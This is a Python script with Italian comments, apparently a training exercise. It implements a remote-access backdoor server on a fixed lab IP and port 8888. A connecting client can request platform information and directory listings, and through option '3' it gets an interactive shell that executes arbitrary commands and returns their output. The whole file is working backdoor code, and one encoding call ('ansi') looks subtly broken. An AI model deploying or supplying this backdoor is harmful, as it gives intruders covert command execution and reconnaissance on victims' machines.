import socket  # Importa il modulo per la comunicazione tramite socket
import platform  # Importa il modulo per ottenere informazioni sul sistema operativo
import os  # Importa il modulo per interagire con il sistema operativo
import subprocess  # Importa il modulo per eseguire comandi di shell

SRV_ADDR = "192.168.90.101"  # Indirizzo IP del server
SRV_PORT = 8888  # Porta del server

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Crea un oggetto socket
s.bind((SRV_ADDR, SRV_PORT))  # Collega il socket all'indirizzo IP e alla porta specificati
s.listen(1)
connection, address = s.accept()  # Accetta la connessione in entrata e restituisce il socket di connessione e l'indirizzo del client
print("Client connesso: ", address)

while True:
    try:
        data = connection.recv(1024)  # Riceve i dati dal client
    except:
        continue

    if data.decode('utf-8') == '1':
        tosend = platform.platform()  # Ottiene le informazioni sulla piattaforma del sistema
        connection.sendall(tosend.encode('utf-8'))
    elif data.decode('utf-8') == '2':
        data = connection.recv(1024)
        try:
            filelist = os.listdir(data.decode('utf-8'))  # Ottiene la lista dei file nella directory specificata
            tosend = ",".join(filelist) if filelist else "Nessun file trovato"  # Concatena i nomi dei file separati da virgola
        except:
            tosend = "Percorso errato"  # Se si verifica un errore, imposta un messaggio di errore
        connection.sendall(tosend.encode('utf-8'))
    elif data.decode('utf-8') == '3':
        connection.sendall(bytes("Shell avviata. Inserisci comandi:", encoding='utf-8') + bytes("\x1b[0m", encoding='ansi') + bytes("\x1b[0m", encoding='437'))  # Invia un messaggio di avviso al client con ANSI e MCP 437 encoding
        while True:
            command = connection.recv(1024).decode('utf-8')  # Riceve il comando dal client
            if command.lower() == 'exit':  # Chiude la connessione con il comadndo "exit"
                break
            output = subprocess.getoutput(command)  # Esegue il comando di shell e ottiene l'output
            connection.sendall(output.encode('utf-8'))
    elif data.decode('utf-8') == '0':
        connection.close()
        connection, address = s.accept()  # Accetta una nuova connessione in entrata e restituisce il socket di connessione e l'indirizzo del client
